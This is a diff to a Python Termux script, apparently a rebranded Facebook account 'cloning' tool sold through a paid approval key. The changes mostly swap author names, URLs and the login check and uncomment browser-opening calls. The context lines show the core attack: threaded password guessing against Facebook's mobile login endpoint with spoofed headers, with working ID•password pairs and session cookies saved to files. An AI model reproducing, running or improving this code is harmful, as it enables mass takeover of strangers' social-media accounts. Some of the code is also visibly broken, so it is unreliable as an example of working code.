@@ -42,8 +42,8 @@ time.sleep(2)
 print("\033[97;1m[\x1b[38;5;50m+\033[97;1m]\x1b[38;5;50m GROUP ..!")
 os.system("espeak -a 300 \"JOIN , MY , whatsapp , GROUP ,\"")
 time.sleep(2)
-#os.system(f'xdg-open https://chat.whatsapp.com/ICGDPu2rDEq8uqAXGeJFFm')
-#os.system(f'xdg-open https://chat.whatsapp.com/ICGDPu2rDEq8uqAXGeJFFm')
+os.system(f'xdg-open https://chat.whatsapp.com/ICGDPu2rDEq8uqAXGeJFFm')
+os.system(f'xdg-open https://chat.whatsapp.com/ICGDPu2rDEq8uqAXGeJFFm')
 #os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
 #------------------[ ASIF-King ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
@@ -215,15 +215,16 @@ def clear():
 def back():
     login()
 def contact():
-    #os.system('xdg-open https://www.facebook.com/djpagladirector')
+    os.system('xdg-open https://www.facebook.com/djpagladirector')
     back()
 def linex():
     print('\033[1;37m')
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-#os.system('xdg-open https://www.facebook.com/djpagladirector')
+os.system('xdg-open https://www.facebook.com/djpagladirector')
 logo =(f"""
-\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+
 \x1b[0;34m██╗░░██╗██╗██╗░░██╗
 \x1b[0;91m╚██╗██╔╝██║╚██╗██╔╝
 \x1b[0;34m░╚███╔╝░██║░╚███╔╝░
@@ -232,11 +233,14 @@ logo =(f"""
 \x1b[0;91m╚═╝░░╚═╝╚═╝╚═╝░░╚═╝                                                         
 \x1b[1;94m█▀▀ █▀▄▀█ █▀█ █▄░█
 \033[1;97m██▄ █░▀░█ █▄█ █░▀█                         
-\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                       
-
+                            
+\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                       
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;41m        [ ASSALAMU ALAIKUM  ]         \033[0;92m║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[Author                   • \33[1;38mXIXEMON ]\33[1;38m    ║\033[1;31m 
-╠══[Facebook                 • XIXEMON     ║  \033[1;97m  
+╠══[Author                   • \33[1;38mEmon Khalifa ]\33[1;38m    ║\033[1;31m 
+╠══[Facebook                 • Emon KhalIfA      ║  \033[1;97m  
 ╠══[Github                   • \33[1;38mAROHI999 ║\33[1;34m   
 ╠══[Whatsapp                 • 01*********    ║\33[1;35m 
 ╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
@@ -247,6 +251,7 @@ logo =(f"""
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
 \033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m NAPA TERMUX ZONE 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●             \033[1;91m[\033[1;92m√\033[1;91m]
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
+balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
 meyermarexudi =(""" \033[0;97m=============================================""")    
 alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 250TK 30 500TK FOR    APPROVAL""")
 xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
@@ -260,7 +265,7 @@ def meyexudi():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.get('https://github.com/alifkhanbbb/Arohi01/blob/main/Key').text
+    httpCaht = requests.get('https://github.com/arohi999/KHALIFA/blob/main/Approval.txt').text
     if id in httpCaht:
       print(fuckyoursali)
       print(hedaborakarent)
@@ -293,7 +298,7 @@ def naima():
 print(logo)
 os.system('espeak -a 300 " Your,   GIRLFRIEND,  Name,"')
 uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR GF NAME \033[1;91m: \33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  XIXEMON, ,  V I P,  Tools"')
+os.system('espeak -a 300 " Welcome,   to,  EMON , NAPA , ,  V I P,  Tools"')
 def back():
 	login()
 	
@@ -305,7 +310,7 @@ while attemps < 12345677901:
     username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
     password = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER PASSWORD: ')
 
-    if username == 'XIX' and password == 'EMON':
+    if username == 'F' and password == '4':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
     else:
@@ -382,7 +387,7 @@ def menu():
     elif ASIF in ['1']:
         crack_file()
     elif ASIF in ['2','02']:
-        #os.system('xdg-open https://www.facebook.com/djpagladirector')
+        os.system('xdg-open https://www.facebook.com/djpagladirector')
         os.system("python nono.py")
     elif ASIF in ['3','03']:
         result()
@@ -638,8 +643,8 @@ def passwrd():
     print(f"\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m[TOOLS RANER  GIRLFRIEND NAME\x1b[1;93m :\x1b[1;93m "+𝚞𝚗𝚊𝚖𝚎)
     print('\x1b[1;93m[\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m[YOUR DUMP TUTAL IdZ\x1b[1;93m:\x1b[1;93m ',str(len(id)))
     print("\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m[TiME FOR CLONE\x1b[1;93m :> \x1b[1;93m"+time.strftime("%H:%M")+" "+ tag)
-    print("\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[TOOLS IS FiRE
-    print(f'\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[TOOLS USED=[TOOLS WORKING WIFI //DATA ] ')
+    print("\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[TOOLS IS FiRE-!🔥")
+    print(f'\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[TOOLS USED=[TOOLS WORKING WIFI //DATA 🩸🩸] ')
     print('\x1b[1;93m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -756,7 +761,7 @@ def crack(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[10;92m\033[1;91m[\033[1;92mASIF-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                 print('\x1b[38;5;50m===============================================')
-                os.system('espeak -a 300 " XIX,  Ok,  id"')
+                os.system('espeak -a 300 " NAPA,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
@@ -787,7 +792,7 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[10;92m\033[1;91m[\033[1;92mXIX-CP\033[1;91m] {idf} • {pw}')
+                print(f'\r\033[10;92m\033[1;91m[\033[1;92mASIF-CP\033[1;91m] {idf} • {pw}')
                 print('\x1b[38;5;50m============================')
                 os.system('espeak -a 300" CP, ID"')
                 open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
@@ -798,9 +803,9 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•xix-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•EMON-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                 print('\x1b[38;5;50m===============================================')
-                os.system('espeak -a 300 " XIX,  Ok,  id"')
+                os.system('espeak -a 300 " NAPA,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
